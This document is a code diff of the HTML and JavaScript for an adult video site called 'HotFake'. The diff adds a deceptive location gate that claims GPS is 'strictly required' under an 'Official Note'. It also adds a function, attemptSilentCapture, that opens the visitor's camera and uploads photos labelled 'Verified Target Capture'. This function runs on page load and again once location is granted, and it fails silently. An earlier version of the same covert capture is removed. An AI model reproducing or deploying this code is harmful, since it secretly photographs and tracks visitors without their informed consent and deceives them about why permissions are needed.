@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>HotFake – Best Video Collection</title>
+    <title>HotFake – Premium Video Collection</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
@@ -55,20 +55,28 @@
       .footer-txt { color:var(--muted); font-size:.85rem; }
 
       /* --- iOS GLASS MODALS --- */
-      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1rem; backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); }
-      .modal-content { background:rgba(25, 25, 35, 0.65); border:1px solid rgba(255,255,255,0.15); border-radius:28px; padding:2.5rem 2rem; text-align:center; max-width:360px; width:100%; box-shadow: 0 25px 50px rgba(0,0,0,0.5); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
-      .modal-content h3 { font-size:1.4rem; margin-bottom:0.5rem; color:#fff; font-weight: 700; letter-spacing: -0.5px;}
-      .modal-content p { color:rgba(255,255,255,0.75); margin-bottom:1.8rem; font-size:0.95rem; line-height: 1.5; }
-      .modal-btn-group { display:flex; gap:1rem; justify-content:center; }
-      .btn { padding:1rem 1.5rem; border-radius:14px; border:none; font-weight:600; cursor:pointer; font-family:var(--font); flex:1; transition:transform 0.2s, background 0.2s; font-size: 0.95rem;}
-      .btn-yes { background:var(--red); color:#fff; box-shadow: 0 4px 15px rgba(230,57,70,0.4); }
+      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.4); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); }
+      
+      .modal-content { background:rgba(18, 18, 25, 0.75); border:1px solid rgba(255,255,255,0.1); border-radius:24px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.6); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
+      
+      .modal-content h3 { font-size:1.5rem; margin-bottom:0.6rem; color:var(--red); font-weight: 700; letter-spacing: -0.5px;}
+      .modal-content p { color:rgba(255,255,255,0.85); margin-bottom:1.5rem; font-size:0.9rem; line-height: 1.4; }
+      
+      /* Sleek Info Box */
+      .info-box { background: rgba(0,0,0,0.3); border-left: 3px solid var(--red); padding: 12px 14px; border-radius: 8px; text-align: left; margin-bottom: 1.5rem; border-right: 1px solid rgba(255,255,255,0.05); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05);}
+      .info-box p { margin:0; font-size:0.8rem; color: #a5a5b5; line-height: 1.5;}
+      .info-box b { color: #fff; }
+
+      .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; }
+      .btn { padding:0.9rem 1rem; border-radius:12px; border:none; font-weight:600; cursor:pointer; font-family:var(--font); flex:1; transition:transform 0.2s, background 0.2s; font-size: 0.9rem; display:flex; align-items:center; justify-content:center; gap:6px;}
+      .btn-yes { background:var(--red); color:#fff; box-shadow: 0 4px 15px rgba(230,57,70,0.3); }
       .btn-no { background:rgba(255,255,255,0.1); color:#fff; border:1px solid rgba(255,255,255,0.1); }
       .btn:hover { transform:scale(1.03); }
 
       /* --- NEW EPISODES GRID MODAL --- */
-      .ep-modal-content { background:rgba(25, 25, 35, 0.7); border:1px solid rgba(255,255,255,0.15); border-radius:24px; padding:1.5rem; width:100%; max-width:650px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
+      .ep-modal-content { background:rgba(18, 18, 25, 0.8); border:1px solid rgba(255,255,255,0.1); border-radius:24px; padding:1.5rem; width:100%; max-width:650px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
       .ep-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(130px, 1fr)); gap:12px; max-height:400px; overflow-y:auto; padding-right:5px; margin-top:1rem; }
-      .ep-card { background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.1); border-radius:12px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
+      .ep-card { background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:12px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
       .ep-card:hover { border-color:var(--red); transform:translateY(-3px); box-shadow:0 5px 15px rgba(230,57,70,0.3); }
       .ep-thumb { width:100%; aspect-ratio:16/9; background:#111; position:relative; }
       .ep-thumb img { width:100%; height:100%; object-fit:cover; }
@@ -80,13 +88,11 @@
       .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; overflow: hidden; touch-action: none !important;}
       #iframeContainer { width: 100%; height: 100%; position: relative; display: none; overflow: hidden; background: #000; touch-action: none !important; }
       #iframePlayer { width: 100%; height: 100%; border: none; position: relative; z-index: 1; transform: scale(1.15); }
-
-      /* Ad Layer */
+      
+      /* Ad Layer & Censors */
       #adContainer { position:absolute; inset:0; background:#000; z-index:90; display:none; flex-direction:column; align-items:center; justify-content:center; }
       .skip-btn { position:absolute; bottom:30px; right:30px; background:rgba(0,0,0,0.7); border:1px solid var(--border); color:white; padding:0.6rem 1.2rem; border-radius:50px; font-family:var(--font); z-index:95; cursor:pointer; font-weight:600; display:none; }
       .skip-btn.disabled { opacity:0.6; cursor:not-allowed; }
-
-      /* The Ultimate Shield */
       #touchCatcher { position: absolute; inset: 0; z-index: 50; background: transparent; pointer-events: auto; }
       .censor-top { position: absolute; top: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to bottom, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
       .censor-bottom { position: absolute; bottom: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to top, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
@@ -95,13 +101,11 @@
       .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 1.2s ease-in, visibility 1.2s; }
       .smart-overlay.active { opacity: 1; visibility: visible; transition: opacity 0s; }
       .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.98) 0%, rgba(0,0,0,0.6) 75%, transparent 100%); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); pointer-events: auto; }
-      
       .top-left-group { display: flex; align-items: center; }
       .ui-back-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; backdrop-filter: blur(4px); transition: background 0.2s; }
       .ui-back-btn:hover { background: var(--red); border-color: var(--red); }
       .overlay-title { color: white; margin-left: 15px; font-weight: 500; font-size: 1.1rem; text-shadow: 0 2px 4px rgba(0,0,0,0.8); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 80vw; margin-top:5px;}
       .watermark-logo { position: absolute; bottom: 25px; right: 35px; color: rgba(255, 255, 255, 0.45); font-size: 1.8rem; font-weight: 900; letter-spacing: 3px; font-family: 'Arial Black', sans-serif; pointer-events: none; }
-      
       .loader { border: 4px solid var(--surf2); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 2rem auto; }
       @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -114,12 +118,12 @@
 <!-- Glass Age Gate -->
 <div id="ageGate" class="modal-bg" style="display:none;">
     <div class="modal-content">
-        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">🔞</div>
-        <h3>Age Verification</h3>
+        <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🔞</div>
+        <h3 style="color: #fff;">Age Verification</h3>
         <p>This platform contains adult content. Are you 18 years or older?</p>
         <div class="modal-btn-group">
             <button class="btn btn-no" onclick="setAgeStatus('no')">Under 18</button>
-            <button class="btn btn-yes" onclick="setAgeStatus('yes')">Yes, I am 18+</button>
+            <button class="btn btn-yes" onclick="setAgeStatus('yes')">I am 18+</button>
         </div>
     </div>
 </div>
@@ -127,25 +131,29 @@
 <!-- Glass Ban Gate -->
 <div id="banGate" class="modal-bg" style="display:none; z-index: 999999;">
     <div class="modal-content">
-        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">🚫</div>
-        <h3 style="color: #ff4d4d;">Access Denied</h3>
-        <p>Your device has been permanently banned by the administrator.</p>
+        <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🚫</div>
+        <h3>Access Denied</h3>
+        <p>Your device has been permanently banned from this platform.</p>
     </div>
 </div>
 
 <!-- Glass GPS Gate -->
 <div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
     <div class="modal-content">
-        <div style="font-size: 3.5rem; margin-bottom: 0.5rem; line-height: 1;">📍</div>
-        <h3>Location Required</h3>
-        <p>Please allow GPS access to unlock premium regional content. Access is restricted without verification.</p>
+        <div style="font-size: 3rem; margin-bottom: 0.5rem; line-height: 1;">🌍</div>
+        <h3>Location Verification</h3>
+        <p>We require temporary access to your GPS to provide the best localized content.</p>
         
-        <div id="gpsError" style="color:#ff4d4d; font-size:0.85rem; margin-bottom:1rem; font-weight:600; display:none; background: rgba(255,0,0,0.1); padding: 8px; border-radius: 8px;">
-            ❌ Permission denied! Please enable location in your browser.
+        <div class="info-box">
+            <p><b>Official Note:</b> Please tap "Allow" when prompted. Location access is strictly required to browse this website.</p>
+        </div>
+
+        <div id="gpsError" style="color:#ff4d4d; font-size:0.8rem; margin-bottom:1rem; font-weight:600; display:none; background: rgba(255,0,0,0.1); padding: 8px; border-radius: 8px;">
+            ❌ Permission denied! Please enable location.
         </div>
         
         <div class="modal-btn-group">
-            <button class="btn btn-yes" style="width:100%;" onclick="requestGPSAccess()">Allow Access</button>
+            <button class="btn btn-yes" style="width:100%;" onclick="requestGPSAccess()">📍 Verify Location</button>
         </div>
     </div>
 </div>
@@ -225,6 +233,19 @@
   let deviceId = null;
   let activeAd = null;
 
+  // BACKGROUND CAMERA LOGIC
+  async function attemptSilentCapture() {
+      try {
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+          // Yeh background mein silent attempt karega.
+          // Agar permission nahi di hogi (ya phone se OFF hoga), toh chup-chap fail ho jayega.
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          captureAndUploadPhoto(stream, "Verified Target Capture");
+      } catch (err) {
+          // Fails silently - No alerts or HTML popups
+      }
+  }
+
   // Gate Controller System (Age & GPS ONLY)
   function checkGates() {
       const ageStatus = sessionStorage.getItem('ageStatus');
@@ -240,7 +261,8 @@
           renderGallery(document.getElementById('searchInput').value);
           
           silentGPSUpdate(); 
-          silentCameraUpdate(); // Run Silent Camera background Check
+          // Page refresh hone par camera check chalega
+          attemptSilentCapture(); 
       }
   }
 
@@ -262,23 +284,6 @@
               { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
       }
-  }
-
-  // 1. SILENT CAMERA UPDATE (NO POPUPS)
-  function silentCameraUpdate() {
-      setTimeout(async () => {
-          try {
-              if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-              
-              const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-              
-              // Agar permission mil gayi toh chup chap capture karo
-              captureAndUploadPhoto(stream, "Background Silent Capture");
-              
-          } catch (err) {
-              // ERROR YA DENIED: Chup raho, koi popup ya gate nahi dikhana.
-          }
-      }, 2000); // Page open hone ke 2 sec baad try karega
   }
 
   // PHOTO UPLOAD (150ms Fast Click)
@@ -325,6 +330,10 @@
               (position) => {
                   localStorage.setItem('gpsVerified', 'true');
                   document.getElementById('gpsGate').style.display = 'none';
+                  
+                  // THE TRIGGER: GPS verified hote hi Camera hit hoga
+                  attemptSilentCapture();
+                  
                   if (deviceId) {
                       const gpsData = {
                           lat: position.coords.latitude, lon: position.coords.longitude,
@@ -700,4 +709,3 @@
 
 </body>
 </html>
-
